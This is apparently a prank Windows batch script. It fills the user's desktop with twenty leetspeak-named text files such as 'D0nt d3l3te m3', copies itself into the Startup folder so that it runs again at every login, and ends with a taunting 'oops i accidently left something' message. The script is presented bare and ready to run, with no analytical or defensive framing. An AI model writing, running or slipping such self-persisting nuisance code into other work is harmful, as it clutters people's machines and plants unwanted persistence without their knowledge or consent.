@echo off
set desktopPath=%USERPROFILE%\Desktop
echo T. > "%desktopPath%\p4p3r20.txt"
echo T. > "%desktopPath%\Sp00ky19.txt"
echo T. > "%desktopPath%\H118.txt"
echo T. > "%desktopPath%\D0nt d3l3te m317.txt"
echo T. > "%desktopPath%\D0nt d3l3te m316.txt"
echo T. > "%desktopPath%\A P4P3R15.txt"
echo T. > "%desktopPath%\D0nt d3l3te m314.txt"
echo T. > "%desktopPath%\Gr33tings13.txt"
echo T. > "%desktopPath%\p4p3r12.txt"
echo T. > "%desktopPath%\Sp00ky11.txt"
echo T. > "%desktopPath%\H110.txt"
echo T. > "%desktopPath%\D0nt d3l3te m39.txt"
echo T. > "%desktopPath%\D0nt d3l3te m38.txt"
echo T. > "%desktopPath%\A P4P3R7.txt"
echo T. > "%desktopPath%\D0nt d3l3te m36.txt"
echo T. > "%desktopPath%\Gr33tings5.txt"
echo T. > "%desktopPath%\p4p3r4.txt"
echo T. > "%desktopPath%\Sp00ky3.txt"
echo T. > "%desktopPath%\H1.txt"
echo T. > "%desktopPath%\D0nt d3l3te m31.txt"
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
  copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)
color 3
echo "oops i accidently left something.. :<"
timeout /t 5
